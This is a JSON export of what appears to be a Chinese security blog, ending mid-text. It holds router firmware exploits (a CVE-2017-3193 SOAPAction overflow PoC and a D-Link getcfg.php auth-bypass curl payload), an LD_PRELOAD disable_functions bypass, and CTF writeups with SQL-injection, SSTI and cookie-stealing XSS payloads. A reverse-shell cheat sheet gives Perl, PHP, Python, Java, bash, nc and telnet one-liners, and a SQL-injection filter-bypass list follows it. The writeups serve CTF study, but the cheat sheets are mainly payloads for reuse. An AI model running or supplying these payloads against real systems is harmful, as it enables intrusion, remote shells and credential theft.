[{"title":"CVE-2017-3193复现","date":"2019-04-24T16:00:00.000Z","path":"2019/04/25/CVE-2017-3193复现/","text":"CVE-2017-3193CVE-2017-3193是网站管理接口HNAP服务的栈溢出漏洞，DIR-850L 2.07 build5及之前的固件都可被攻击。 搭建环境到Dlink官方ftp服务器下载固件DIR-850L_REVB_FIRMWARE_2.07.B05_WW.ZIP 用binwalk分析，发现没有结果，应该是固件进行了加密，利用文章Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol 里的脚本进行解密。 解密后，binwalk成功分析出内容。 这里使用了firmware-analysis-toolkit进行对固件的模拟。 漏洞分析存在漏洞的程序为squashfs-root/htdocs/cgibin 定位到HTTP_SOAPACTION查看。 这里从环境变量中获取了HTTP_SOAPACTION的值，未经检查直接放入栈中造成栈溢出。 PoC1234567891011121314POST /HNAP1/ HTTP/1.1Host: 192.168.0.1User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://192.168.0.1/info/Login.htmlSOAPAction:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXAAAACookie: uid=vdgBn8ibbOConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 0","tags":[{"name":"Bin","slug":"Bin","permalink":"http://yoursite.com/tags/Bin/"},{"name":"固件分析","slug":"固件分析","permalink":"http://yoursite.com/tags/固件分析/"}]},{"title":"利用LD_PRELOAD绕过disbale_functions","date":"2019-03-25T16:00:00.000Z","path":"2019/03/26/利用LD_PRELOAD绕过disbale_functions/","text":"0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。 0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。 index.php123456Imagick is a awesome library for hackers to break `disable_functions`.So I installed php-imagick in the server, opened a `backdoor` for you.Let&apos;s try to execute `/readflag` to get the flag.Open basedir: /var/www/html:/tmp/415c92e8be7c68409ca6bd369d87482fHint: eval($_POST[&quot;backdoor&quot;]); index.php就是一句话木马，密码是backdoor。提示我们用Imagick插件绕过disable_functions，执行/readflag来获得flag。并给出了open basedir。 首先查看一下disable_functions。payload:backdoor=echo ini_get(&#39;disable_functions&#39;); 除了默认设置禁用的pcntl的一系列函数还禁用了system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail。 一开始去找了Imagick插件的漏洞，但都在当前版本中被修复了。之后看到了LD_PRELOAD利用mail()函数绕过disable_functions的方法。和Imagick结合，成功拿到了flag。 0x02 Sendmail+LD_PRELOAD绕过disable_functions1在 UNIX 的动态链接库的世界中，LD_PRELOAD 是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。 当程序运行时需要调用系统共享对象中的函数时，我们可以通过设置LD_PRELOAD来优先加载我们编写的恶意代码来劫持原本系统共享对象的代码。 攻击过程：1、生成含有恶意代码的动态链接程序。2、运用putenv来设置LD_PRELOAD，优先调用我们编写的程序。3、通过webshell触发函数。 很多文章以sendmail为例子。利用readelf -Ws /usr/sbin/sendmail查看其调用的库函数，从中选择了geteuid()函数来劫持。 1234567891011121314151617181920#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;int geteuid ()&#123; const char* cmdline = \"ls &gt; /var/www/html/test.txt\"; int i; for (i = 0; environ[i]; ++i) &#123; if (strstr(environ[i], \"LD_PRELOAD\")) &#123; environ[i][0] = '\\0'; &#125; &#125; system(cmdline);&#125; 程序运行，共享库的geteuid()被调用时，通过system()执行命令。 在尽量和服务器相同的环境中将它编译为一个共享对象。 gcc -shared -fPIC exp.c -o exp.so 将.so文件传输到服务器中，运用php代码设置为LD_PRELOAD 12putenv(\"LD_PRELOAD=/var/www/exp.so\");mail(\"admin@admin.com\",\"\",\"\",\"\",\"\"); 此时在/var/www/html/目录下就会产生test.txt。 因为利用了sendmail调用geteuid()，进行了劫持，所以没有安装sendmail时无法使用这个函数。 在这道题中，并没有sendmail，也就无法劫持getuid()函数。 0x03 C 语言扩展修饰符 attribute((constructor))123GNU C 的一大特色就是__attribute__ 机制。__attribute__ 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。__attribute__ ((constructor))会使函数在main()函数之前被执行。 如果我们在我们的函数之前采用这个修饰符，那么程序在加载系统共享对象的时候会优先执行我们的函数，这样就可以不用对特定的函数进行劫持，直接绕过disable_functions。 修改后的payload：1234567891011121314151617181920#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123; const char* cmdline = \"/readflag &gt; /tmp/415c92e8be7c68409ca6bd369d87482f/asd\"; int i; for (i = 0; environ[i]; ++i) &#123; if (strstr(environ[i], \"LD_PRELOAD\")) &#123; environ[i][0] = '\\0'; &#125; &#125; system(cmdline);&#125; 同时上传一个doc文件，用Imagick加载。 因为没有了特定函数劫持的限制，只要我们执行mail函数，不管有没有安装sendmail都可以直接绕过disable_functions。 参考文章 PHP disable_functions Bypass 的方法探究无需sendmail：巧用LD_PRELOAD突破disable_functionsbypass_disablefunc_via_LD_PRELOAD/bypass_disablefunc.c","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"php","slug":"php","permalink":"http://yoursite.com/tags/php/"}]},{"title":"2018鹏城杯myblog&shadow Writeup","date":"2018-11-30T16:00:00.000Z","path":"2018/12/01/2018鹏城杯Web(部分)Writeup/","text":"myblog这道题脑洞很大。。。 index.php的header中有flag: JTNGZmxhZw==，解base64得到参数%3Fflag，猜测index.php存在文件包含，运用flag参数读文件。 payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=index 1234567&lt;?php header('flag: JTNGZmxhZw=='); if(isset($_GET[\"flag\"]))&#123; $flag = $_GET[\"flag\"]; include $flag.\".php\"; &#125;?&gt; 提示aboutyou后端，about里也提到了base64，猜测存在YWJvdXQ=.php payload:http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=YWJvdXQ= 123456789101112131415161718&lt;?php $filename = 'flag.txt'; $flag = 'flag.txt'; extract($_GET); if(isset($sign))&#123; $file = trim(file_get_contents($filename)); if($sign === $file)&#123; echo 'Congratulation!&lt;br&gt;'; echo file_get_contents($$falg); &#125; else&#123; echo 'don`t give up'; &#125; &#125;?&gt; 变量覆盖，让$sign为空，$file读取不存在的文件，让$falg为flag读取文件。 payload:http://58.20.46.150:26293/YWJvdXQ=.php?sign=&amp;filename=123&amp;falg=flag shadow这题没有拿到flag，但是感觉也进行了绝大部分了，记录一下 题目提示有upload，直接访问提示Only admin can use it! 尝试模版注入拿到secret_key进行session伪造，发现访问不存在的页面可以进行模版注入 payload:1+1 &#125;&#125;```123456过滤了括号等，和twctf2018的Shrine相似[CTFtime.org _ TokyoWesterns CTF 4th 2018 _ Shrine _ Writeup](https://ctftime.org/writeup/10895)payload:```http://58.20.46.150:25524/&#123;&#123; url_for.__globals__[&apos;current_app&apos;].config &#125;&#125; 拿到secret_key为:as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf 构造session，以admin登陆，访问upload，发现文件的表单名是xml，猜测可以上传xml内容进行解析 用xinclude来读取文件 1234&lt;?xml version=“1.0” ?&gt;&lt;root xmlns:xi=“http://www.w3.org/2001/XInclude“&gt;&lt;xi:include href=“file:///etc/passwd” parse=“text”/&gt;&lt;/root&gt; 但是最后没有找到flag，比赛结束了。。。不知道是不是有没发现的东西。","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"Dlink DIR-823L远程敏感信息读取漏洞","date":"2018-11-14T16:18:13.918Z","path":"2018/11/15/Dlink DIR-823L远程敏感信息读取漏洞/","text":"有幸加入了360的IOT计划，接触一下IOT安全。 前期准备下载固件Dlink DIR-850L A1 FW v1.14固件下载 环境准备安装binwalk和qemu123brew install biwalkbrew install qemubrew install squashfs 固件提取1binwalk -Me DIR850LA1_FW114WWb07.bin 固件分析因为不是很懂Bin的知识，所以到squashfs-root/htdocs/web分析php页面。 找到htdocs/web/getcfg.php文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;? include \"/htdocs/phplib/trace.php\";function is_power_user() //管理用户权限&#123; if($_GLOBALS[\"AUTHORIZED_GROUP\"] == \"\") &#123; return 0; &#125; if($_GLOBALS[\"AUTHORIZED_GROUP\"] &lt; 0) &#123; return 0; &#125; return 1;&#125;if ($_POST[\"CACHE\"] == \"true\")&#123; echo dump(1, \"/runtime/session/\".$SESSION_UID.\"/postxml\");&#125;else&#123; if(is_power_user() == 1) &#123; /* cut_count() will return 0 when no or only one token. */ $SERVICE_COUNT = cut_count($_POST[\"SERVICES\"], \",\"); TRACE_debug(\"GETCFG: got \".$SERVICE_COUNT.\" service(s): \".$_POST[\"SERVICES\"]); $SERVICE_INDEX = 0; while ($SERVICE_INDEX &lt; $SERVICE_COUNT) &#123; $GETCFG_SVC = cut($_POST[\"SERVICES\"], $SERVICE_INDEX, \",\"); TRACE_debug(\"GETCFG: serivce[\".$SERVICE_INDEX.\"] = \".$GETCFG_SVC); if ($GETCFG_SVC!=\"\") &#123; $file = \"/htdocs/webinc/getcfg/\".$GETCFG_SVC.\".xml.php\"; //读取文件直接拼接到字符串 /* GETCFG_SVC will be passed to the child process. */ if (isfile($file)==\"1\") dophp(\"load\", $file); &#125; $SERVICE_INDEX++; &#125; &#125; else &#123; /* not a power user, return error message */ echo \"\\t&lt;result&gt;FAILED&lt;/result&gt;\\n\"; echo \"\\t&lt;message&gt;Not authorized&lt;/message&gt;\\n\"; &#125;&#125;?&gt; $GETCFG_SVC变量直接从POST中获取，并且没有过滤就直接放入了字符串，只要能绕过is_power_user()j就能构造payload读取敏感文件，$_GLOBALS数组是在cgibin文件中定义的，而不是php的原生数组。所以需要分析一下cgibin文件。 mips架构没法用ida反编译，Web狗看不懂汇编代码，只能放到jeb里反编译。 对main进行分析，不同的请求会到不同的文件处理，找到phpcgi函数。 下面是关键代码123456789101112131415$$v0 = sess_validate($$a0, $$a1, 524288, $$a3);$$a2 = $$v0;$$v0 = sprintf(&amp;var30_8, \"AUTHORIZED_GROUP=%d\");$$v0 = sobj_add_string($$s0, &amp;var30_8, $$a2, $$a3);$$v0 = sobj_add_char($$s0, 10, $$a2, $$a3);$$v0 = sobj_add_string($$s0, \"SESSION_UID=\", $$a2, $$a3);$$v0 = sess_get_uid($$s0, \"SESSION_UID=\", $$a2, $$a3);$$v0 = sobj_add_char($$s0, 10, $$a2, $$a3);$$v0 = sobj_get_string($$s0, 10, $$a2, $$a3);$$a0 = 0;$$a2 = $$v0;$$a3 = **&amp;gvar_437E18;$$a1 = 0;$$v0 = xmldbc_ephp(0, 0, $$a2, $$a3);$$s1 = $$v0; 在 phpcgi_main 函数中，程序将不同的请求头处理后传给了php。关键代码将经过sess_validate验证的数据，赋值给AUTHORIZED_GROUP，然后再作为全局数组$_GLOBALS传递给PHP程序使用。sobj_add_string以 \\n分隔储存在字符串中，所以用户可以通过注入带有 \\n 字符的恶意 payload 来伪造$_GLOBALS[&quot;AUTHORIZED_GROUP&quot;]的值，从而读取敏感文件。 payload:1curl -d &quot;SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1&quot; &quot;http://ip:port/getcfg.php&quot; 参考文章https://xz.aliyun.com/t/2941","tags":[{"name":"固件分析","slug":"固件分析","permalink":"http://yoursite.com/tags/固件分析/"}]},{"title":"hctf2018 Web部分Writeup","date":"2018-11-11T12:29:17.662Z","path":"2018/11/11/hctf2018 Web部分Writeup/","text":"又是一年双十一，又是一年hctf，web狗写一下自己学到的，做出来的题目 Warmup查看源代码在注释里发现source.php，访问得到index.php的代码。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; CVE-2018-12613 phpMyAdmin后台文件包含分析 paylaod:http://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../../../ffffllllaaaagggg flag:hctf{e8a73a09cfdd1c9a11cca29b2bf9796f} kzonewww.zip下载到源码，分析源码 在include/safe.php里找到了waf 1$blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\\#|\\s/i'; 在memeber.php里发现了json_decode()函数，json_decode()在解json格式的同时还会将unicode转码。利用unicode绕过waf，对login_data注入。 payload:cookie:islogin=1;login_data={&quot;admin_user&quot;:&quot;\\u0061\\u0064\\u006d\\u0069\\u006e\\u0027\\u0020\\u0061\\u006e\\u0064\\u0020\\u0069\\u0066\\u0028\\u0028\\u0073\\u0075\\u0062\\u0073\\u0074\\u0072\\u0028\\u0028\\u0064\\u0061\\u0074\\u0061\\u0062\\u0061\\u0073\\u0065\\u0028\\u0029\\u0029\\u002c\\u0031\\u002c\\u0031\\u0029\\u003d\\u0027\\u0068\\u0027\\u0029\\u002c\\u0073\\u006c\\u0065\\u0065\\u0070\\u0028\\u0035\\u0029\\u002c\\u0031\\u0029\\u0023&quot;,&quot;admin_password&quot;:&quot;123&quot;} 直接上timesql的脚本12345678910111213141516171819202122232425262728import requests,time,stringdef unicode(s): unis = '' for i in s: unis += '\\u00'+i.encode(\"hex\") return unisurl = \"http://kzone.2018.hctf.io/admin/index.php\"dic = \"hctf&#123;&#125;1234567890qweryuiopasdgjklzxvbnm\"flag = ''for i in range(1,40): for c in dic: #payload = \"admin' and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'),sleep(5),1)#\" % (i,s) #payload = \"admin' and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='F1444g'),%d,1)='%s'),sleep(5),1)#\" % (i,s) payload = \"admin' and if((substr((select binary F1a9 from F1444g),%d,1)='%s'),sleep(5),1)#\" % (i,c) payload = unicode(payload) cookies = &#123; \"islogin\":\"1\", \"login_data\":'&#123;\"admin_user\":\"'+payload+'\",\"admin_pass\":\"123\"&#125;' &#125; time_start = time.time() c = requests.get(url=url,cookies=cookies).content time_end = time.time() if time_end - time_start &gt;= 5: flag += c print flag break flag:hctf{4526a8cbd741b3f790f95ad32c2514b9} admingithub下载源码 还是unicode的用法 unicode安全 注册ᴬdminstrlower()可以将ᴬ变为A，再登陆修改密码A变为a flag:hctf{un1c0dE_cHe4t_1s_FuNnying} bottleBottle HTTP 头注入漏洞，找到了离别歌师傅的博客 Bottle HTTP 头注入漏洞探究 payload:http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0AX-XSS-Protection:0%0A%0A%3Cscript%3Elocation.href=http://ip/xss/index.php?a=`%2bdocument.cookie%3C/script%3E` hide and seek上传zip，利用软连接读取文件 12ln -s xxx xxxzip -y xxx.zip xxx 123456789101112131415161718192021222324252627282930313233343536373839404142434445/etc/nginx/nginx.confuser nginx; worker_processes auto; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events &#123; worker_connections 1024; &#125; http &#123; include /etc/nginx/mime.types; default_type application/octet-stream; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; &#125; daemon off; /etc/nginx/conf.d/nginx.confserver &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; &#125; /etc/uwsgi/uwsgi.ini[uwsgi]socket = /tmp/uwsgi.sockchown-socket = nginx:nginxchmod-socket = 664# Graceful shutdown on SIGTERM, see https://github.com/unbit/uwsgi/issues/849#issuecomment-118869386hook-master-start = unix_signal:15 gracefully_kill_them_all/proc/self/environUWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=7d8beb1a9aa4SHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini[uwsgi]module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_maincallable=app 然后读取源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['zip'])def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET'])def index(): error = request.args.get('error', '') if(error == '1'): session.pop('username', None) return render_template('index.html', forbidden=1) if 'username' in session: return render_template('index.html', user=session['username'], flag=flag.flag) else: return render_template('index.html')@app.route('/login', methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] if request.method == 'POST' and username != '' and password != '': if(username == 'admin'): return redirect(url_for('index',error=1)) session['username'] = username return redirect(url_for('index'))@app.route('/logout', methods=['GET'])def logout(): session.pop('username', None) return redirect(url_for('index'))@app.route('/upload', methods=['POST'])def upload_file(): if 'the_file' not in request.files: return redirect(url_for('index')) file = request.files['the_file'] if file.filename == '': return redirect(url_for('index')) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a zipfile' try: extract_path = file_save_path + '_' os.system('unzip -n ' + file_save_path + ' -d '+ extract_path) read_obj = os.popen('cat ' + extract_path + '/*') file = read_obj.read() read_obj.close() os.system('rm -rf ' + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64dcode('aGN0Zg==').decode('utf-8')) != -1): return redirect(url_for('index', error=1)) return Response(file)if __name__ == '__main__': #app.run(debug=True) app.run(host='127.0.0.1', debug=True, port=10008) SECRET_KEY中的随机数种子是uuid.getnode()的值，可以通过读取/sys/class/net/eth0/addressmac地址获得 伪造admin的cookie123456789101112from flask import session,Flaskimport randomrandom.seed(20015589129314)app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100)@app.route('/', methods=['GET'])def index(): session['username']='admin' return \"123\"app.run(host='127.0.0.1', debug=True, port=10008) flag:hctf{2495e2ef667b367a0738f5eae9d6afb983c2}","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"2018科来杯山东省省赛Web Writeup","date":"2018-11-04T16:00:00.000Z","path":"2018/11/05/2018科来杯山东省省赛Web Writeup/","text":"babyWebweb签到题 ip不在允许范围，修改header头的client-ip为127.0.0.1 你不是管理员，修改cookie中的admin值为1即可。 babyWeb2123456789101112131415161718&lt;?php include 'here.php'; $key = 'kelaibei'; if(isset($_GET['id']))&#123; $id = $_GET['id']; @parse_str($id); if ($key[99] != 'aabg7XSs' &amp;&amp; md5($key[99]) == md5('aabg7XSs')) &#123; echo $hint; &#125; else&#123; echo 'try again'; &#125; &#125; else&#123; show_source(__FILE__); &#125; parse_str()函数存在变量覆盖，可以覆盖变量key[99] aabg7XSs的md5值为0e087386482136013740957780965295，而且用了双等号，存在弱类型 payload:id=key[99]=s878926199a 到upl04d50m3thing.php页面 可以上传文件，但是会修改文件内容为too slow，而且上传时有一定的延时，猜测在延迟时访问上传的文件可以访问到。 1234567import requestswhile(True): url = 'http://x.x.x.x/uploads/5761c4916bc4034ebbaea308db0d350137f0778b/w1test.php' r = requests.get(url).content if not 'slow' in r: print r 运行脚本，用burp重放上传的数据包即可拿到flag。 Easy_flask题目提供了Add a Comment和Search Comment两个功能 尝试ssti，username=&#39;test&#39;&amp;comment=，搜索test 存在ssti，但是Add a Comment中username和comment两个参数限制了字符长度，最多提交10个字符，没法运用ssti。 测试search功能，username参数存在sql注入,payload:username=test&#39; union select 1,2,3 -- wtest 构造union注入的参数进行ssti,payload:username=test&#39; union select 1,2,&quot;&quot; -- wtest 通过基础类的方式构造payload，payload:1username=test&apos; union select 1,2,&quot;&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;cat /flag&apos;).read()&#125;&#125;&quot; -- wtest","tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://yoursite.com/tags/Writeup/"}]},{"title":"反弹shell小结","date":"2018-09-08T16:00:00.000Z","path":"2018/09/09/反弹shell小结/","text":"攻击机监听1nc -lvvp 7777 靶机远程反弹shellPerl123perl -e 'use Socket;$i=\"x.x.x.x\";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;'perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:xxxx\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' php1php -r '$sock=fsockopen(\"x.x.x.x\",xxxx);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' python1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Java123r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/x.x.x.x/12345;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])p.waitFor() bash123bash -c &apos;sh -i &amp;&gt;/dev/tcp/x.x.x.x/xxxx 0&gt;&amp;1&apos;bash -i &gt;&amp; /dev/tcp/x.x.x.x/xxxx 0&gt;&amp;1 nc支持-e1nc -e /bin/sh x.x.x.x xxxx 不支持-e1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc x.x.x.x 12345 &gt;/tmp/f telnet1rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 12345 0&lt;/tmp/p | /bin/bash 1&gt;/tmp/p 正向链接靶机1nc -l -p xxxx -e /bin/bash 攻击机1nc x.x.x.x xxxx","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"}]},{"title":"Sql注入绕过姿势","date":"2018-06-09T16:00:00.000Z","path":"2018/06/10/Sql注入绕过姿势/","text":"整理一下sql注入的各种绕过姿势，以后做题方便查阅。 0x00 注释符常用注释：12345678//--%20/**/#--+-- -%00; 0x01 大小写绕过用于绕过一些对大小写敏感的黑名单匹配 ?id=1 UnIon SeLeCt user()# 0x02 双写绕过waf将关键字替换为空，没有递归 ?id=1 uniunionon seselectlect user()# 0x03 编码绕过利用urlencode，ascii(char)，hex，unicode等编码绕过123456789101112131415161718192021222324252627or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。十六进制编码SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))双重编码绕过?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+一些unicode编码举例： 单引号：&apos;%u0027 %u02b9 %u02bc%u02c8 %u2032%uff07 %c0%27%c0%a7 %e0%80%a7空白：%u0020 %uff00%c0%20 %c0%a0 %e0%80%a0左括号(:%u0028 %uff08%c0%28 %c0%a8%e0%80%a8右括号):%u0029 %uff09%c0%29 %c0%a9%e0%80%a9 0x04 绕过空格1234用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/()绕过空格 0x05 like绕过12?id=1&apos; or 1 like 1#可以绕过对 = &gt; 等过滤 0x06 in绕过12or &apos;1&apos; IN (&apos;1234&apos;)#可以替代= 0x07 等价函数或变量12345678910111213141516171819hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74 或者：substr((select &apos;password&apos;),1,1) = 0x70strcmp(left(&apos;password&apos;,1), 0x69) = 1strcmp(left(&apos;password&apos;,1), 0x70) = 0strcmp(left(&apos;password&apos;,1), 0x71) = -1 0x08 生僻函数1234567891011MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\\l\\x65rt(1)&apos;as \\117n\\x65rror)); //postgresql?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))and extractvalue(1, concat(0x5c, (select user()),0x5c)) 0x09 反引号绕过1select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用 0x0a 宽字节绕过123宽字节绕过主要是sql数据库编码问题造成的，在过滤单引号时，可以尝试用%bf%27 %df%27 %aa%27绕过 0x0b \\N绕过\\N相当于NULL字符123select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 0x0c 特殊的绕过函数1.用greatest()绕过&lt;&gt;123456mysql&gt; select greatest(ascii(mid(user(),1,1)),150)=150; +------------------------------------------+| greatest(ascii(mid(user(),1,1)),150)=150 | +------------------------------------------+| 1 | +------------------------------------------+ 2.使用mid()等逗号被过滤的情况mid(user() from 1 for 1) substr(user() from 1 for 1) 123456mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150; +------------------------------------------+| 